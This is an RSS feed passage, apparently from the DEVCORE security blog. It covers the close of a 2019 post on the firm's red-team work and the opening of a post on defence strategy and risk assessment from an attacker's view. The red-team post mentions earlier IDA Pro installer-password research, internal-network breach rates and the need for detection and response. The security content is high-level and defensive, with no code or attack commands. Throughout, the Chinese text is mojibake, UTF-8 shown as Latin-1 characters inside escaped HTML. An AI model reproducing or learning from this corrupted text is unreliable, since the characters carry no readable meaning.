æˆ‘å€‘æœ‰ä¸€å€‹èŠ±è²»ä¸€å€‹æœˆçš„ä¾‹å­ï¼Œæ˜¯ä¹‹å‰&lt;a href=&quot;https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;ç ´è§£ IDA Pro å½éš¨æ©Ÿæ•¸&lt;/a&gt;çš„ç ”ç©¶ï¼Œé€™å€‹äº‹ä»¶æ„å¤–åœ¨ binary åœˆå¾ˆæœ‰åï¼Œç”šè‡³é‚„æœ‰äººå¯«æˆ&lt;a href=&quot;https://medium.com/the-singularity-is-near/recent-leak-of-ida-pro-7-2-a-brief-timeline-4c1dcbe6331e&quot;&gt;äº‹ä»¶æ‡¶äººåŒ…&lt;/a&gt;ã€‚é€™å€‹ç ”ç©¶æ˜¯åœ¨æ¢è¨å¦‚æœæˆ‘å€‘æ²’æœ‰å®‰è£å¯†ç¢¼ï¼Œæœ‰æ©Ÿæœƒå®‰è£ IDA PRO å—ï¼Ÿçµæœæœ€å¾Œæˆ‘å€‘æƒ³è¾¦æ³•é€†æ¨å‡ºäº† IDA å¯†ç¢¼ç”¢ç”Ÿå™¨çš„ç®—æ³•ï¼ŒçŸ¥é“å½éš¨æ©Ÿæ•¸ä½¿ç”¨äº†å“ªäº›å­—å…ƒï¼Œå’Œå®ƒçš„æ­£ç¢ºæ’åºã€‚é€™ä»¶äº‹æƒ…çš„é›£åº¦å·²ç¶“ä¸åªåœ¨æŠ€è¡“ä¸Šï¼Œè€Œåœ¨æ–¼è¦çŒœå‡ºå½éš¨æ©Ÿæ•¸ä½¿ç”¨çš„å­—å…ƒé›†é †åºï¼Œé‚„è¦åŒæ™‚çŒœå‡ºå°æ–¹ä½¿ç”¨çš„æ¼”ç®—æ³•ï¼ˆè‡³å°‘æœ‰88ç¨®ï¼‰ã€‚è€Œä¸”æˆ‘å€‘æ¯é©—è­‰ä¸€ç¨®æ’åˆ—çµ„åˆï¼Œå°±æœƒèŠ±åŠå¤©æ™‚é–“å’Œ 100GB çš„ç©ºé–“ï¼Œç´¯ç©æˆæœ¬æ»¿é«˜çš„ã€‚ä½†æˆ‘å€‘æ ¹æ“šç¶“é©—ç›¸ä¿¡é€™æ˜¯æœ‰æ©ŸæœƒæˆåŠŸçš„ï¼Œä¸¦ä¸”æŠ•æ³¨è³‡æºå …æŒä¸‹å»ï¼Œæœ€å¾Œæœ‰äº†å¾ˆä¸éŒ¯çš„æˆæœã€‚&lt;/p&gt;

&lt;p&gt;é€™è£¡ä¸æ˜¯åœ¨é¼“å‹µä¸€æ„å­¤è¡Œï¼Œè€Œæ˜¯ä¸€ç¨®å¿ƒç†ç´ è³ªï¼šæ˜¯åœ¨é¢è‡¨å¡é—œçš„æ™‚å€™ï¼Œæœ‰è¶³å¤ çš„åˆ¤æ–·åŠ›ï¼Œæ–¹å‘éŒ¯èª¤èƒ½æœæ–·æ”¾æ£„ï¼Œå¦‚æœæ–¹å‘æ­£ç¢ºè¦æœ‰å …æŒä¸‹å»çš„å‹‡æ°£ã€‚&lt;/p&gt;

&lt;h2 id=&quot;è³‡å®‰é˜²è­·è¶¨å‹¢èˆ‡ç´…éšŠçš„ä¸‹ä¸€æ­¥&quot;&gt;è³‡å®‰é˜²è­·è¶¨å‹¢èˆ‡ç´…éšŠçš„ä¸‹ä¸€æ­¥&lt;/h2&gt;

&lt;p&gt;æ–‡ç« çš„æœ€å¾Œä¸€éƒ¨åˆ†è¦è«‡çš„æ˜¯ç´…éšŠæ¼”ç·´çš„æœªä¾†ï¼Œä¹Ÿæ˜¯é€™ç¯‡æ–‡ç« çš„é‡é»ï¼Œæœªä¾†ï¼Œæˆ‘å€‘å¸Œæœ›å¯ä»¥è§£æ±ºä»€éº¼å•é¡Œï¼Ÿ&lt;/p&gt;

&lt;p&gt;åšç‚ºç´…éšŠæ¼”ç·´çš„é ˜å°å» å•†ï¼Œå¾ 2017 å¹´æ¼”ç·´åˆ°ç¾åœ¨æˆ‘å€‘é€²å…¥å°ç£ä¼æ¥­å…§ç¶²çš„æˆåŠŸç‡æ˜¯ 100%ã€‚æˆ‘å€‘åœ¨è¶…éå…­æˆçš„æ¼”ç·´æ¡ˆä¸­æ‹¿åˆ° AD ç®¡ç†æ¬Šé™ï¼Œé€™é‚„ä¸å«é‚£äº›ä¸æ˜¯ç”¨ AD ä¾†ç®¡ç†çš„ä¼æ¥­ã€‚æˆ‘å€‘ç™¼ç¾é€²å…¥å…§ç¶²å¾Œï¼Œé€šå¸¸ä¸æœƒæœ‰ä»€éº¼é˜»ç¤™ï¼Œå°±å¥½åƒè®Šæˆå…§éƒ¨å“¡å·¥ï¼Œæ‰“äº†è²æ‹›å‘¼å°±å¯ä»¥é€²æ©Ÿæˆ¿ã€‚æƒ³è¦æé†’å¤§å®¶çš„æ˜¯ï¼šå°é ‚å°–æ”»æ“Šåœ˜éšŠè€Œè¨€ï¼Œé€²å…¥ä¼æ¥­å…§ç¶²çš„é›£åº¦ä¸¦ä¸é«˜ã€‚å¦‚æœç¢°ä¸Šé ‚å°–çš„é§­å®¢ï¼Œæˆ–æ˜¯ä¸€å€‹ 0dayï¼Œä¼æ¥­æº–å‚™å¥½äº†å—ï¼Ÿé€™å°±æ˜¯ç¾éšæ®µæˆ‘å€‘æ‰€ç™¼ç¾çš„å•é¡Œï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨èªªåˆ°æŠµç¦¦æ”»æ“Šé€šå¸¸æœƒæœ‰ä¸‰å€‹é¢å‘ï¼Œåˆ†åˆ¥æ˜¯ã€Œé é˜²ã€ã€ã€Œåµæ¸¬ã€å’Œã€Œå›æ‡‰ã€ã€‚ä¸€èˆ¬è€Œè¨€ä¼æ¥­åœ¨ã€Œé é˜²ã€é€™éƒ¨ä»½åšçš„æ¯”è¼ƒå®Œå–„ï¼Œå°æ–¼å·²çŸ¥çš„å¼±é»éƒ½æœ‰æ¯”è¼ƒé«˜çš„æŒæ¡åº¦ã€‚ä»Šå¤©æ™®éçš„å•é¡Œåœ¨ã€Œ&lt;strong&gt;åµæ¸¬&lt;/strong&gt;ã€å’Œã€Œ&lt;strong&gt;å›æ‡‰&lt;/strong&gt;ã€ä¸Šï¼Œä¼æ¥­èƒ½ä¸èƒ½ç™¼ç¾æœ‰äººåœ¨å°ä½ é€²è¡Œæ”»æ“Šï¼Ÿæˆ–æ˜¯çŸ¥é“è¢«æ”»æ“Šå¾Œæœ‰æ²’æœ‰èƒ½åŠ›å³æ™‚å›æ‡‰ä¸¦ä¸”æ ¹çµ•æºé ­ï¼Ÿé€™å…©ä»¶äº‹æƒ…åšå¾—ç›¸å°ä¸å¥½çš„åŸå› ä¸¦ä¸æ˜¯ä¼æ¥­æ²’æœ‰æŠ•å…¥è³‡æºåœ¨ä¸Šé¢ï¼Œè€Œæ˜¯å°æ–¼ä¼æ¥­ä¾†èªªå¤ªé›£é©—è­‰ï¼Œå¾ˆé›£æœ‰å€‹æ¨™æº–å»ç¢ºå®šç›®å‰çš„æ©Ÿåˆ¶æœ‰æ²’æœ‰æ•ˆæˆ–æ˜¯è²·äº†è¨­å‚™æœ‰æ²’æœ‰ä½œç”¨ï¼Œå°±ç®—æœ‰è—éšŠé€šå¸¸ä¹Ÿæ²’æœ‰å»ºç«‹å®Œå–„çš„æ‡‰å° SOPï¼Œç•¢ç«Ÿé§­å®¢å…¥ä¾µä¸æœƒæ˜¯å¤©å¤©ç™¼ç”Ÿçš„äº‹æƒ…ã€‚&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ï¼Œæˆ‘å€‘å¸Œæœ›ä¼æ¥­èƒ½å¾ç´…éšŠæ¼”ç·´ä¸­ï¼Œè¨“ç·´å°æ”»æ“Šäº‹ä»¶çš„åµæ¸¬å’Œåæ‡‰èƒ½åŠ›ã€‚æˆ–æ˜¯èªªï¼Œç´…éšŠæ¼”ç·´çš„æœ¬è³ªå°±æ˜¯åœ¨çœŸå¯¦çš„æ¼”ç·´ï¼Œé€éæ”»é˜²å¹«åŠ©ä¼æ¥­äº†è§£è‡ªå·±çš„å¼±é …ã€‚éå»å°ç£çš„ç´…éšŠæœå‹™éƒ½æœƒå¼·èª¿åœ¨æ‰¾å‡ºæ•´å€‹ä¼æ¥­çš„å¼±é»ï¼Œæ‰¾å‡ºæ¼æ´å›ºç„¶é‡è¦ï¼Œä½†ç¢°åˆ°åƒæˆ‘å€‘ä¸€æ¨£å¾ˆå¸¸æ‰¾åˆ° 0-day çš„çµ„ç¹”ï¼Œæœ‰åµæ¸¬å’Œå›æ‡‰èƒ½åŠ›æ‰æ˜¯æœ€å¾Œèƒ½æ•‘ä½ ä¸€å‘½çš„ç¡¬æŠ€èƒ½ã€‚æ›å€‹è§’åº¦ä¾†çœ‹ï¼Œç›®å‰ä¸–ç•Œä¸Šæœ€å®Œæ•´çš„æ”»æ“Šæˆ°ç•¥å’ŒæŠ€è¡“æ‰‹æ³•åˆ—è¡¨æ˜¯ &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK Framework&lt;/a&gt;ï¼Œä¸€å€‹å°ä¼æ¥­æœ‰å‚·å®³çš„æ”»æ“Šè¡Œå‹•é€šå¸¸æœƒæ˜¯å¾ˆå¤šå€‹æ”»æ“Šæ‰‹æ³•æ‰€çµ„æˆçš„æ”»æ“Šéˆï¼Œè€Œåœ¨é€™å€‹ Framework ä¸­ï¼Œæ‰¾åˆ°èµ·å§‹å¼±é»é€™ä»¶äº‹æƒ…åƒ…ä½”äº†æ•´å€‹æ”»æ“Šéˆä¸åˆ°ä¸€æˆï¼Œä¼æ¥­å¦‚æœèƒ½å¤ æŠ•æ³¨åœ¨å…¶ä»–ä¹æˆæ‰‹æ³•çš„åµæ¸¬èƒ½åŠ›ä¸Šä¸¦é˜»æ–·å…¶ä¸­ä»»ä¸€ç’°ç¯€ï¼Œå°±æœ‰æ©Ÿæœƒè®“æ•´å€‹æ”»æ“Šè¡Œå‹•å¤±æ•—è€Œä¿è­·åˆ°è³‡ç”¢ã€‚&lt;/p&gt;

&lt;p&gt;è¦èªªçš„æ˜¯ï¼Œæˆ‘å€‘ç´…éšŠæ¼”ç·´é™¤äº†æ‰¾å‡ºä¼æ¥­æ¼æ´èƒ½åŠ›é ‚å°–ä¹‹å¤–ï¼Œä¹Ÿç´¯ç©äº†å¾ˆè±å¯Œçš„å…§ç¶²æ»²é€ç¶“é©—åŠæŠ€å·§ï¼Œæˆ‘å€‘å¾ˆæ¨‚æ„é€éæ¼”ç·´å”åŠ©ä¼æ¥­åŠ å¼·çœŸå¯¦çš„åµæ¸¬å’Œå›æ‡‰èƒ½åŠ›ã€‚æ¼¸æ¼¸çš„ï¼Œæœªä¾†ç´…éšŠæœƒæ…¢æ…¢è‘—é‡åœ¨å’Œè—éšŠçš„æ”»é˜²æ¼”ç·´ã€‚æœƒå¼·èª¿æ“¬å®šæˆ°ç•¥ï¼Œè®“ä¼æ¥­äº†è§£è‡ªå·±å°å“ªäº›æ”»æ“Šçš„é˜²ç¦¦èƒ½åŠ›æ¯”è¼ƒå¼±ï¼Œé€²è€Œå»æ”¹å–„ã€‚æœªä¾†çš„ç´…éšŠä¹Ÿæ›´éœ€è¦å¼·èª¿èˆ‡é˜²ç¦¦æ©Ÿåˆ¶äº¤æ‰‹çš„ç¶“é©—ï¼Œäº†è§£é˜²ç¦¦çš„æ¥µé™ï¼Œæ‰æœ‰è¾¦æ³•æ‰¾åˆ°è¨­å‚™è¨­å®šä¸å…¨æˆ–æ˜¯æ¶µè“‹ç‡ä¸è¶³çš„ç›²é»ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘ä¹Ÿæœ‰äº›è¦åŠƒå»ºè­°çµ¦å°è³‡å®‰é˜²ç¦¦æ¯”è¼ƒæˆç†Ÿçš„ä¼æ¥­å¦‚ä¸‹ï¼Œé€æ­¥è½å¯¦å¯ä»¥å°‡è³‡å®‰é«”è³ªææ˜‡ä¸€å€‹å±¤æ¬¡ã€‚ï¼ˆè‡³å°‘å¾æˆ‘å€‘çš„ç¶“é©—ä¾†çœ‹ï¼Œæœ‰é€™äº›æ¦‚å¿µçš„ä¼æ¥­éƒ½æ˜¯ç‰¹åˆ¥é›£æ”»æ“Šé”æˆç›®æ¨™çš„ï¼‰&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚æœå¤–ç¶²å®‰å…¨å·²æŠ•è³‡å¤šå¹´ï¼Œé–‹å§‹æ€è€ƒã€Œ&lt;strong&gt;å¦‚æœé§­å®¢å·²ç¶“åœ¨å…§ç¶²&lt;/strong&gt;ã€çš„é˜²ç¦¦ç­–ç•¥&lt;/li&gt;
  &lt;li&gt;ç›¤é»å‡ºæœ€ä¸å¯ä»¥è¢«æ´©æ¼çš„é‡è¦è³‡æ–™ï¼Œå¾é€™äº›åœ°æ–¹é–‹å§‹å¥‰è¡Œ &lt;strong&gt;Zero Trust&lt;/strong&gt; æ¦‚å¿µ&lt;/li&gt;
  &lt;li&gt;ä¼æ¥­å…§éƒ¨éœ€è¦æœ‰å°ˆè·è³‡å®‰äººå“¡ç·¨åˆ¶ï¼ˆè—éšŠï¼‰&lt;/li&gt;
  &lt;li&gt;é€éèˆ‡æœ‰ç¶“é©—çš„ç´…éšŠåˆä½œï¼Œå…¨ç›¤æª¢è¦–é˜²ç¦¦ç›²é»&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;

&lt;p&gt;ç ”è¨æœƒå…§å®¹åˆ°é€™é‚Šå°±çµæŸäº†ã€‚å¯«åœ¨æœ€å¾Œçš„æœ€å¾Œï¼Œæ˜¯å……æ»¿è‘—æ„Ÿè¬ã€‚å…¶å¯¦ç„¡è«–æ»²é€æ¸¬è©¦é‚„æ˜¯ç´…éšŠæ¼”ç·´ï¼Œåœ¨ä¸€é–‹å§‹éƒ½ä¸æ˜¯äººäººå¯ä»¥æ¥å—çš„ï¼Œè€Œæ¸¬è©¦çš„åƒ¹å€¼ä¹Ÿä¸æ˜¯æˆ‘å€‘èªªäº†ç®—ã€‚ä¸€è·¯èµ°ä¾†ï¼Œæ¼¸æ¼¸æ¼¸æ¼¸æ„Ÿå—åˆ°é–‹å§‹æœ‰äººç›¸ä¿¡æˆ‘å€‘ï¼Œå¾æ—©æœŸæ¯”è¼ƒå¤šæ¸¬è©¦æ™‚èˆ‡å·¥ç¨‹å¸«å’Œç¶²ç®¡äººå“¡çš„å°ç«‹ï¼Œåˆ°è¿‘æœŸè¶Šä¾†è¶Šå¤š open mindã€å°±æ˜¯æƒ³æ‰¾å‡ºå•é¡Œçš„å®¢æˆ¶ï¼Œæ˜¯æ»¿å¤§çš„å°æ¯”ã€‚éå¸¸æ„Ÿè¬ä»–å€‘çš„ä¿¡ä»»ï¼Œä¹Ÿå› ç‚ºé€™æ¨£çš„äº’ä¿¡ï¼Œæˆ‘å€‘å¾—ä»¥ç¯€çœæ™‚é–“å®Œæˆæ›´æ£’çš„ç”¢å‡ºã€‚æ»¿æ¨‚è¦‹å°ç£è³‡è¨Šç”¢æ¥­æ˜¯é€™æ¨£æ­£å‘é¢å°å•é¡Œï¼Œæ¼æ´å­˜åœ¨å°±æ˜¯å­˜åœ¨ï¼Œä¸æœƒå› ç‚ºè¦–è€Œä¸è¦‹è€ŒçœŸçš„ä¸è¦‹ï¼Œæ„è­˜åˆ°æœ‰å•é¡Œè§£æ±ºäº†å°±å¥½ã€‚æ‰€ä»¥æˆ‘åœ¨æ¼”è¬›æœ€å¾Œç•™ä¸‹é€™æ¨£ä¸€å¥ï¼šã€&lt;strong&gt;ç´…éšŠæ¼”ç·´çš„ç²¾é«“ä¸æ˜¯åœ¨å‘Šè¨´ä½ æœ‰å¤šè„†å¼±ï¼Œåœ¨æ–¼çœŸæ­£å£äººé—–å…¥æ™‚ä½ å¯ä»¥ç¨ç•¶ä¸€é¢æ“‹ä¸‹&lt;/strong&gt;ã€ï¼Œå¸Œæœ›è¶Šä¾†è¶Šå¤šäººèƒ½æ­£é¢å°å¾…å•é¡Œï¼ŒåŒæ™‚ä¹Ÿå‚³éæˆ‘å€‘æƒ³è¦åšåˆ°çš„åƒ¹å€¼ã€‚&lt;/p&gt;

&lt;p&gt;2019 DEVCORE CONFï¼Œè¬è¬éå»åˆä½œçš„æœ‹å‹å€‘åƒèˆ‡è®“ DEVCORE ç´…éšŠå¾—ä»¥é€²åŒ–ï¼Œå¸Œæœ›ä¸‹ä¸€æ­¥ä¹Ÿèƒ½æœ‰ä½ ï¼Œæˆ‘å€‘æ˜å¹´è¦‹ :)&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next/</link>
                <guid>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next</guid>
                <pubDate>Thu, 24 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä»¥æ”»æ“Šè€…çš„è§’åº¦åˆ¶å®šé˜²ç¦¦ç­–ç•¥</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;é€™ç¯‡æ–‡ç« æºè‡ªæ–¼å…¬å¸ä»Šå¹´ç¬¬ä¸€æ¬¡è©¦è¾¦çš„ç ”è¨æœƒ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt;ï¼Œæˆ‘å€‘æ±ºå®šå¦å¤–å¯«æˆ blog åˆ†äº«å‡ºä¾†ï¼Œè®“ç„¡æ³•åƒåŠ çš„æœ‹å‹ä¹Ÿå¯ä»¥å¾ä¸åŒè§’åº¦é‡æ–°æ€è€ƒé˜²ç¦¦ç­–ç•¥ã€‚&lt;/p&gt;

&lt;p&gt;æœƒæƒ³åœ¨ç´”æŠ€è¡“å°å‘çš„ç ”è¨æœƒä¸­åŠ å…¥ç­–ç•¥é¢çš„è­°é¡Œï¼Œå…¶å¯¦è·Ÿä»Šå¹´ç ”è¨æœƒçš„ä¸»è»¸ã€Œ&lt;strong&gt;å¾ç­–ç•¥æ“¬å®šæ§åˆ¶ï¼Œå¾æ§åˆ¶åæ˜ æ„è­˜&lt;/strong&gt;ã€æœ‰é—œã€‚å¦‚æœä¼æ¥­ç¼ºä¹é•·é æ­£ç¢ºçš„è³‡å®‰ç­–ç•¥ï¼Œé™¤äº†æŠ•å…¥çš„è³‡æºç„¡æ³•é”åˆ°ä¼æ¥­é æœŸçš„æ•ˆç›Šã€ä¸€ç·šè³‡å®‰äººå“¡ç–²æ–¼å¥”å‘½å¤–ï¼Œç®¡ç†éšå±¤åœ¨è³‡è¨Šä¸å°ç¨±çš„æƒ…æ³ä¸‹èªç‚ºæŠ•å…¥çš„è³‡æºå·²ç¶“è¶³å¤ å®‰å…¨ï¼Œæœ€çµ‚å½¢æˆæƒ¡æ€§å¾ªç’°ï¼Œåªèƒ½åœ¨æ¯æ¬¡è³‡å®‰äº‹æ•…å¾Œè·Ÿè‘—æ™‚ä¸‹æµè¡Œé¸æ“‡æœ€å¤¯è³‡å®‰çš„ç”¢å“ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç†æƒ³ä¸­çš„é˜²ç¦¦ç­–ç•¥&quot;&gt;ç†æƒ³ä¸­çš„é˜²ç¦¦ç­–ç•¥&lt;/h2&gt;
&lt;p&gt;è€Œæœ€å»£ç‚ºäººçŸ¥çš„é˜²ç¦¦ç­–ç•¥å¯èƒ½æ˜¯ç¸±æ·±é˜²ç¦¦ï¼Œä»¥ä¸åŒé¡å‹çš„æ§åˆ¶æªæ–½ (è¨­å‚™ã€åˆ¶åº¦ã€æœå‹™) æ¸›å°‘æ•µäººå…¥ä¾µçš„å¯èƒ½æ€§ã€å„˜é‡æ¸›å°‘å–®ä¸€æ§åˆ¶æªæ–½å¤±æ•ˆé€ æˆçš„é¢¨éšªã€‚ç„¶è€Œï¼Œé€™å€‹æ¦‚å¿µæœ‰å¹¾å€‹éœ€è¦æ€è€ƒçš„é‡é»&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;é˜²è­·é‚Šç•Œé å¤§æ–¼ä¼æ¥­çš„æƒ³åƒï¼šå°è‡´ç„¡æ³•æŒæ¡ä¼æ¥­å¯èƒ½çš„å…¥ä¾µé»ã€‚&lt;/li&gt;
  &lt;li&gt;å°è³‡å®‰è¨­å‚™èªçŸ¥éŒ¯èª¤ï¼šé€™è®“æ•µäººå¯ä»¥ç¹éè³‡å®‰è¨­å‚™ï¼Œæˆ–æ˜¯è¨­å‚™æ²’æœ‰ç™¼æ®ä¼æ¥­é æœŸçš„æ•ˆç”¨ã€‚&lt;/li&gt;
  &lt;li&gt;ç®¡ç†ç¨‹åºä¸å¤ è½å¯¦ï¼šå°è‡´æ§åˆ¶æªæ–½ç”¢ç”Ÿæ–°çš„æ¼æ´ï¼Œè­¬å¦‚é è¨­å¯†ç¢¼æ²’æœ‰æ›´æ”¹ï¼Œå°è‡´ VPN æˆ–ç¶²è·¯è¨­å‚™å¯ä»¥ç›´æ¥è¢«å­˜å–ã€‚&lt;/li&gt;
  &lt;li&gt;å¿½è¦–é‡è¦è³‡ç”¢ç›¸é—œæ€§ï¼šåªå°‡é˜²ç¦¦è³‡æºæŠ•æ³¨åœ¨é‡è¦è³‡ç”¢æœ¬èº«ï¼Œè€Œè¼•å¿½èˆ‡å…¶ç›¸é€£çš„è³‡ç”¢ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™ä¸€é€£ä¸²çš„ç–å¿½ï¼Œå¯èƒ½æˆç‚ºæ”»æ“Šè€…å…¥ä¾µçš„è·¯å¾‘ï¼Œå°±æ˜¯æ‰€è¬‚çš„ç‘å£«èµ·å¸æ¨¡å‹ ï¼ˆSwiss Cheese Model)ï¼Œå› æ­¤ä¼æ¥­æœŸæœ›é€éé¢¨éšªè©•é‘‘ (Risk Assessment) ä¾†ç›¤é»å‡ºå¯èƒ½çš„ç–å¤±ï¼Œä¸¦ä¸”åœ¨æ¬Šè¡¡è³‡æºä¸‹ï¼Œç¢ºä¿å°‡é‡å¿ƒæ”¾åœ¨é«˜é¢¨éšªéœ€è¦å„ªå…ˆè™•ç†çš„é …ç›®ã€‚&lt;/p&gt;

&lt;p&gt;ä½†æˆ‘å€‘æƒ³èŠèŠé€™å€‹å·¥å…·åœ¨å¯¦å‹™ä¸Šæœ‰å®ƒé›£ä»¥å®Œå–„ä¹‹è™•ï¼Œä»¥åŠå¾æ”»æ“Šè€…çš„è§’åº¦æ˜¯æ€æ¨£çœ‹å¾…é€™å€‹æ“¬è¨‚é˜²ç¦¦ç­–ç•¥æ ¸å¿ƒå·¥å…·ï¼Œæˆ‘å€‘æœƒé‡å°ä¸€ä¸‹è­°é¡Œä¾åºèªªæ˜&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;çœŸå¯¦é¢¨éšªå…¶å¯¦è¤‡é›œçš„é›£ä»¥è©•ä¼°&lt;/li&gt;
  &lt;li&gt;ç¾è¡Œé¢¨éšªè©•é‘‘æ–¹å¼å¯èƒ½çš„åå·®&lt;/li&gt;
  &lt;li&gt;å¾æ”»æ“Šè€…çš„è§’åº¦æ”¹å–„é¢¨éšªè©•é‘‘&lt;/li&gt;
  &lt;li&gt;æŒ‘é¸é©åˆçš„æ–¹æ³•æ”¹å–„é¢¨éšªè©•é‘‘&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;çœŸå¯¦çš„é¢¨éšªå…¶å¯¦è¤‡é›œçš„é›£ä»¥è©•é‘‘&quot;&gt;çœŸå¯¦çš„é¢¨éšªå…¶å¯¦è¤‡é›œçš„é›£ä»¥è©•é‘‘&lt;/h2&gt;
&lt;p&gt;åœ¨é€™è£¡æˆ‘å€‘å¼•è¿° ITGovernance å°æ–¼é¢¨éšªè©•é‘‘çš„å®šç¾©ï¼š&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Risk Assessment â€“ the process of identifying, analyzing and evaluating risk â€“ is the only way to ensure that the cyber security controls you choose are appropriate to the risks your organization faces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;é¢¨éšªè©•é‘‘çš„ç²¾é«“åœ¨æ–¼å¾ŒåŠæ®µçš„&lt;strong&gt;ç¢ºä¿æ‰€é¸æ“‡çš„æ§åˆ¶æªæ–½æ˜¯å¦é©åˆ‡æ–¼ä¼æ¥­çœŸæ­£é¢è‡¨çš„é¢¨éšª&lt;/strong&gt;ï¼Œä½†å¤šæ•¸çš„ä¼æ¥­åªå®Œæˆå‰åŠæ®µ&lt;strong&gt;è­˜åˆ¥ã€åˆ†æåŠè©•ä¼°é¢¨éšª&lt;/strong&gt;ï¼Œå°è‡´é¢¨éšªè©•é‘‘çš„æˆæ•ˆç„¡æ³•å®Œå…¨ç™¼æ®ï¼›è€Œè¦é”åˆ°é¢¨éšªè©•é‘‘çš„ç²¾é«“ï¼Œå¾—å…ˆäº†è§£&lt;strong&gt;çœŸå¯¦çš„é¢¨éšª&lt;/strong&gt;çš„çµ„æˆçš„è¦ç´ &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;çœŸå¯¦é¢¨éšª = { å¨è„…ä¾†æºã€æ„åœ–ã€å¨è„…ã€å¼±é»ã€æ©Ÿç‡ã€ç›¸ä¾æ€§ã€è³‡ç”¢åƒ¹å€¼ã€æ§åˆ¶æªæ–½ }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;å¨è„…ä¾†æº(Threat Agent)ï¼šé€ æˆå¨è„…æˆ–ä½¿ç”¨å¼±é»çš„ä¾†æºå€‹é«”ï¼Œä¾‹å¦‚ï¼šçµ„ç¹”å‹çŠ¯ç½ªã€é§­å®¢çµ„ç¹”ã€åœ‹å®¶è³‡åŠ©çŠ¯ç½ªã€ç«¶çˆ­å°æ‰‹ã€é§­å®¢ã€å…§éƒ¨å“¡å·¥æˆ–å¤©ç½ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;æ„åœ–(Intent)ï¼šå¨è„…ä¾†æºçš„æƒ³é”åˆ°çš„ç›®çš„ï¼Œä¾‹å¦‚ï¼šå–å¾—å€‹äººè³‡æ–™ã€ç›œå–å•†æ¥­æ©Ÿå¯†ã€ç ´å£ä¼æ¥­/å€‹äººå½¢è±¡ã€é€ æˆè²¡ç‰©æå¤±ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;å¨è„…(Threat)ï¼šé”æˆæ„åœ–çš„æ–¹å¼ï¼Œä¾‹å¦‚ï¼šæƒ¡æ„ç¨‹å¼ã€ç¤¾äº¤å·¥ç¨‹ã€DDoSã€åˆ©ç”¨ç³»çµ±æ¼æ´ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;å¼±é»(Vulnerability)ï¼šæŒ‡è³‡ç”¢èƒ½è¢«å¨è„…åˆ©ç”¨çš„å¼±é»ï¼Œä¾‹å¦‚ï¼šæ¼æ´æœªæ›´æ–°ã€äººå“¡ç–å¿½ã€çµ„æ…‹è¨­å®šä¸ç•¶ã€ç¶²è·¯å€éš”é…ç½®éŒ¯èª¤ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;æ©Ÿç‡(Probability)ï¼šæŒ‡å¼±é»çš„æ˜“ç”¨åº¦æˆ–å¯èƒ½ç™¼ç”Ÿçš„æ©Ÿç‡ï¼Œä¾‹å¦‚ï¼šCVSS 3.0åˆ†æ•¸ã€éå»å°æ–¼æŸå€‹å¼±é»ç™¼ç”Ÿé »ç‡çš„çµ±è¨ˆç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;ç›¸ä¾æ€§(Correlation)ï¼šè³‡ç”¢å½¼æ­¤é–“çš„é—œè¯ï¼Œä¾‹å¦‚ï¼šç¶²è·¯æ‹“æ¨¸ã€è™›æ“¬åŒ–çš„é—œä¿‚ã€é›†ä¸­æ´¾ç‰ˆç³»çµ±ã€é˜²æ¯’ä¸­æ§ä¸»æ©Ÿç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;è³‡ç”¢åƒ¹å€¼(Value)ï¼šä¼æ¥­èªå®šè©²è³‡ç”¢åœ¨ Cã€Iã€A åŠæ³•å¾‹è¡æ“Šä¸‹ï¼Œæ‰€å…·æœ‰çš„åƒ¹å€¼ï¼Œä¾‹å¦‚ï¼šæ ¸å¿ƒç³»çµ±åŠè³‡æ–™ã€ä¸€èˆ¬æ“ä½œè³‡æ–™ã€å¯¦é«”è¨­å‚™ç­‰ã€‚&lt;/li&gt;
